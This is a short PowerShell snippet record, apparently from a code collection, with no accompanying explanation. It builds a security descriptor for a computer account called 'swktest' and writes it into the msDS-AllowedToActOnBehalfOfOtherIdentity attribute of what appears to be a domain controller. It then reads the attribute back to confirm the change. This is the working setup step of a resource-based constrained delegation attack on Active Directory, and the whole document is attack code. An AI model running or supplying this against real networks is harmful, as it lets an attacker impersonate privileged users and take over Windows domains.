---
id: e964f0f6-a5ed-42f5-9764-d272833a82fb
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:07.771111+00:00'
updated_at: '2023-04-06T03:56:07.771111+00:00'
---

# Code Snippet e964f0f6

**Language**: Powershell

```powershell
$ComputerSid = Get-DomainComputer swktest -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer dc01-ww2.factory.lan | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
$RawBytes = Get-DomainComputer dc01-ww2.factory.lan -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
$Descriptor.DiscretionaryAcl
```


